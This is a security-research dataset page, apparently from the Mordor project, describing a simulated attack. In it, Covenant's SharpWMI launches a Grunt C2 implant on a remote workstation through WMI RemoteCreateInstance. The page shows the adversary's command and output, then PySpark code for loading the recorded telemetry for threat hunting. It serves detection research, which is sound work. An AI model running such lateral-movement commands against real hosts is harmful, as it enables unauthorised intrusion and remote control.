# Covenant WMI RemoteCreateInstance

## Metadata


|                   |    |
|:------------------|:---|
| id                | SDWIN-200806035621 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2020/08/06 |
| platform          | Windows |
| Mordor Environment| Mordor shire |
| Simulation Type   | C2 |
| Simulation Tool   | Covenant |
| Simulation Script | https://github.com/cobbr/Covenant/blob/19e4a17048ade1b854241bb5d938398860ab5981/Covenant/Data/Tasks/GhostPack.yaml |
| Mordor Dataset    | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/covenant_sharpwmi_dcerpc_wmi_remotecreateinstance.zip |

## Dataset Description
This dataset represents a threat actor leveragin WMI to create processes and execute code remotely via the RemoteCreateInstance method.

## Adversary View
```
(wardog) > SharpWMI /command:"action=exec computername=WORKSTATION6 command=\"C:\\Windows\\System32\\GruntHTTP2.exe\""

[*] Host                           : WORKSTATION6

[*] Command                        : "C:\\Windows\\System32\\GruntHTTP2.exe"

[*] Creation of process returned   : 0

[*] Process ID                     : 3824
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/covenant_sharpwmi_dcerpc_wmi_remotecreateinstance.zip"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        
